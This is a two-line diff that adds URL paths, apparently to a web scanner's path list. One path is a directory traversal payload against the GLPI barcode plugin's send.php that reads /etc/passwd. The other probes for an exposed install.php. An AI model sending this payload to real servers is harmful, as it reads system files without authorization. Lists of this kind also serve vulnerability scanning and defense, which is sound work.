@@ -1,0 +1,2 @@
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
+/install/install.php
